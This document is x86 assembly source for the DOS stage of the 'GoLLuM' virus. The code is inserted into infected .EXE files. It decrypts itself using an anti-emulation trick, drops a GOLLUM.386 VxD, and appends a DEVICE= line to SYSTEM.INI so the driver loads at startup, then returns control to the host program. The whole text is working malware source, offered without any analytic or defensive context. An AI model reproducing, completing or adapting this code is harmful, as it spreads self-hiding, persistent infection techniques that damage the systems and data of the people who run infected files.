   ; - -[GOLLUM.ASM - DOS virus code]- - - - - - - - - - - - - - - - - - - ->8

   I_am_GoLLuM     segment para 'CODE'

   Header_Size     equ 1Ch
   VxD_File_Size   equ 6592
   Decryptor_Size  equ offset Bilbo_Dead
   All_Size        equ offset Old_Header+(Header_Size+VxD_File_Size)
           Assume  cs:I_am_GoLLuM,ds:I_am_GoLLuM,es:I_am_GoLLuM,ss:I_am_GoLLuM

   ;Virus entry point (code inserted intro infected .EXE files)
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   GoLLuM_Entry_Point:
           ;Get delta offset stored on infection
           mov bp,0000h
           ;Save segment regs
           push ds
           push es
           ;Point segment regs to our code
           mov ax,cs
           mov ds,ax
           mov es,ax
           ;Decrypt virus and VxD file
           mov si,offset Bilbo_Dead
           add si,bp
           mov di,si
           mov cx,(All_Size-Decryptor_Size+01h)/02h
   Decrypt_Gollum:

           ;Dont let GoLLum be emulated (Meeethyyyl! ;)
           cld
           lodsw
           push ax
           pop ax
           cli
           sub sp,0002h
           pop ax
           sti
           not ax
           cld
           stosw
           loop Decrypt_Gollum
           ;Clear prefetch
           db 0EBh,00h

   ;Drop GOLLUM.386 file and insert DEVICE=GOLLUM.386 into SYSTEM.INI
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   Bilbo_Dead:
           ;Find SYSTEM.INI file
           mov si,offset Win_Sys_Table
           add si,bp
           mov cx,0005h
           cld
   Search_Loop:
           lodsw
           mov dx,ax
           add dx,bp
           ;Open file (read/write access)
           mov ax,3D02h
           int 21h
           jnc Open_Ok
           ;Try next file name
           loop Search_Loop
           jmp Gollum_Leave
   Open_Ok:
           ;Save SYSTEM.INI file handle
           mov word ptr cs:[System_Handle][bp],ax
           ;Build VxD file name
           mov si,dx
           mov di,offset VxD_File
           add di,bp
           mov dx,di
   Copy_Directory:
           lodsb
           cmp al,"."
           je Found_Extension
           stosb
           jmp Copy_Directory
   Found_Extension:
           ;Insert the path separator
           mov al,"\"
           stosb
           ;Insert the name of the VxD file
           mov si,offset Device_String+09h
           add si,bp
           mov cx,000Ah
           rep movsb
           ;Put the null marker
           xor al,al
           stosb
           ;Create de VxD file, abort if exist
           mov ah,5Bh
           xor cx,cx
           mov dx,offset VxD_File
           add dx,bp
           int 21h
           jc Close_Sys
           ;Write VxD to file
           xchg bx,ax
           mov ah,40h
           mov dx,offset Old_Header+Header_Size
           add dx,bp
           mov cx,VxD_File_Size
           int 21h
           jnc ok_VxD_Write
           ;Close VxD file if error...
           mov ah,3Eh
           int 21h
           ;...and delete it!
           mov ah,41h
           mov dx,offset VxD_File
           add dx,bp
           int 21h
   Close_Sys:
           mov bx,word ptr cs:[System_Handle][bp]
           jmp Exit_Infection
   ok_VxD_Write:
           ;Get handle of SYSTEM.INI file
           mov bx,word ptr cs:[System_Handle][bp]
           ;Seek to EOF
           mov ax,4202h
           xor cx,cx
           xor dx,dx
           int 21h
           jc Bad_Size
           ;Strange! SYSTEM.INI file too big
           or dx,dx
           jnz Bad_Size
           cmp ax,VxD_File_Size
           jb Size_Ok
   Bad_Size:
           jmp Exit_Infection
   Size_Ok:
           ;Save SYSTEM.INI file size
           mov word ptr cs:[System_Size][bp],ax
           ;Seek to BOF
           mov ax,4200h
           xor cx,cx
           xor dx,dx
           int 21h
           jc Bad_Size
           ;Read SYSTEM.INI over VxD file copy
           mov ah,3Fh
           mov cx,word ptr cs:[System_Size][bp]
           mov dx,offset Old_Header+Header_Size
           add dx,bp
           int 21h
           jc bad_size
           ;Check if SYSTEM.INI have been infected
           mov cx,word ptr cs:[System_Size][bp]
           mov di,dx
           mov al,"G"
   Do_Inspect:
           cld
           repne scasb
           or cx,cx
           jz System_Clean
           ;Exit if already resident
           cmp word ptr es:[di],"LO"
           jne Do_Inspect
           cmp word ptr es:[di+02h],"UL"
           jne Do_Inspect
           jmp Exit_Infection
   System_Clean:
           ;Search for [386Enh] string
           mov cx,word ptr cs:[System_Size][bp]
           mov di,dx
   Section_Search:
           cld
           mov si,di
           lodsw
           cmp ax,"3["
           jne Next_Char
           lodsw
           cmp ax,"68"
           je Section_Found
   Next_Char:
           inc di
           loop Section_Search
           ;Section not found, abort
           jmp Exit_Infection
   Section_Found:
           ;Save distance from [386Enh] string to EOF
           mov ax,0008h
           sub cx,ax
           add di,ax
           sub word ptr cs:[System_Size][bp],cx
           ;Seek next to [386Enh] string
           mov ax,4202h
           mov dx,cx
           neg dx
           xor cx,cx
           dec cx
           int 21h
           jc Exit_Infection
           ;Write our load string
           mov ah,40h
           mov cx,0015h
           mov dx,offset Device_String
           add dx,bp
           int 21h
           jc Exit_Infection
           ;Write the rest of SYSTEM.INI file
           mov ah,40h
           mov cx,word ptr cs:[System_Size][bp]
           mov dx,di
           int 21h
   Exit_Infection:
           ;Close file (bx=handle)
           mov ah,3Eh
           int 21h

   ;Get control back to host
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   Gollum_Leave:
           ;Restore segment registers
           pop es
           pop ds
           ;File SYSTEM.INI not found, return to host
           mov ah,62h
           int 21h
           add bx,10h
           add word ptr cs:[exe_cs][bp],bx
           ;Restore stack
           cli
           add bx,word ptr cs:[Old_Header+0Eh][bp]
           mov ss,bx
           mov sp,word ptr cs:[Old_Header+10h][bp]
           sti
           ;Clear some regs
           xor ax,ax
           xor bx,bx
           xor cx,cx
           xor dx,dx
           xor si,si
           xor di,di
           xor bp,bp
           ;Clear prefetch
           db 0EBh,00h
           ;Jump to original entry point
           db 0EAh
   exe_ip  dw 0000h
   exe_cs  dw 0000h

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                   ;String table
   Win_Sys_Table   dw offset Win_Sys_01h
                   dw offset Win_Sys_02h
                   dw offset Win_Sys_03h
                   dw offset Win_Sys_04h
                   dw offset Win_Sys_05h
                   ;Posible locations of SYSTEM.INI file
   Win_Sys_01h     db "C:\WINDOWS\SYSTEM.INI",00h
   Win_Sys_02h     db "C:\WIN\SYSTEM.INI",00h
   Win_Sys_03h     db "C:\WIN31\SYSTEM.INI",00h
   Win_Sys_04h     db "C:\WIN311\SYSTEM.INI",00h
   Win_Sys_05h     db "C:\WIN95\SYSTEM.INI",00h
                   ;Buffer where virus build VxD file name and path
   VxD_File        db 20h dup (00h)
                   ;String inserted into SYSTEM.INI
   Device_String   db 0Dh,0Ah,"DEVICE=GOLLUM.386",0Dh,0Ah
                   ;Misc data
   System_Size     dw 0000h
   System_Handle   dw 0000h
                   ;Next bytes = Old .EXE header + VxD file copy
   Old_Header      equ this byte
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   I_am_GoLLuM     ends
                   end GoLLuM_Entry_Point
